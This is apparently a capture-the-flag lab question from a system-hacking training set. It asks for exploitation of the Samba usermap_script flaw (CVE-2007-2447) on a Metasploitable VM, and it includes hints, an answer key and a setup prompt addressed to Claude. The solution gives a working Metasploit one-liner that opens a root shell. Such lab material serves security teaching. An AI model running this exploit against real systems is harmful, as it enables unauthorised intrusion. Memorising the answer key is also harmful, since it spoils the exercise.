# Q044 — Samba usermap_script RCE

| Field | Value |
|---|---|
| **Target** | `192.168.52.129` / `192.168.52.130` |
| **Domain** | 05 — System Hacking |
| **Difficulty** | 🟡 Medium |
| **Tools** | `metasploit`, `hydra`, `john`, `hashcat`, `linpeas`, `mimikatz` |
| **Time budget** | 15–25 min |

---

## 📝 Question

Exploit Samba 3.x `usermap_script` (CVE-2007-2447) on Metasploitable. Report `whoami` from the resulting shell.

---

## 🎯 Flag Format

```
user=<name>
```

Example: `user=root`

**⚠️ Format strict hai** — lowercase, no spaces around `=`, semicolon separator where shown.

---

## 💡 Hints

<details>
<summary>Hint 1 (click)</summary>

Module: `exploit/multi/samba/usermap_script`.
</details>

<details>
<summary>Hint 2</summary>

Bind/reverse netcat payload works.
</details>

---

## ✅ Solution

<details>
<summary>Show solution</summary>

```bash
msfconsole -q -x 'use exploit/multi/samba/usermap_script; set RHOSTS 192.168.52.129; set LHOST 192.168.52.128; run'
```

Yields a root shell.

**Answer:** `user=root`

📖 Ref: [playbooks/exploitation-playbook.md](../../playbooks/exploitation-playbook.md)
</details>

---

## 🤖 Claude Setup Prompt (for Claude-on-your-PC)

```
1. Verify VMs running: ping 192.168.52.129 and ping 192.168.52.130 from 192.168.52.128.
2. Required services for this Q already up by default on the relevant target.
3. If something is down, restart it on the target VM.

Report back: "Lab ready for Q044".
```
